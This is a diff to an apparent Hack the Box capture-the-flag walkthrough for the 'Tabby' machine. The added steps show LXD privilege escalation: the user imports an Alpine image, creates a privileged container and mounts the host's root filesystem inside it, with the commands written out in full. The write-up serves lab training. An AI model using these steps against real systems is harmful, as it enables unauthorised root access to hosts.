@@ -248,17 +248,32 @@ Start a local python server.
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/38061230-630a-458b-895e-54ca44c41868)
 
-Initiate `lxd`, input no to all prompts.
-![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/5baadf28-e25c-4220-8dbd-a0511ed4a9d2)
+Initiate `lxd`.
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/8a61ec15-92d5-4528-a663-1146e845aee6)
 
-Import the Alpine Image
+Import the Alpine Image.
 ```CSS
 ash@tabby:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/f0d6c555-f546-48c8-85bd-e40c410c57eb)
 
-Check Import
+Check Import.
 ```CSS
 ash@tabby:~$ lxc image list
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d2db9947-159b-4a4e-b24c-d7a272029b6c)
+
+Make the container privileged, and mount the filesystem, before starting the container.
+```CSS
+ash@tabby:~$ lxc init alpine mycontainer -c security.privileged=true
+Creating mycontainer
+
+ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+<ydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to mycontainer
+
+ash@tabby:~$ lxc start mycontainer
+lxc start mycontainer
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/83afa919-e4ad-43ac-b2f2-e2fd54534c69)
+
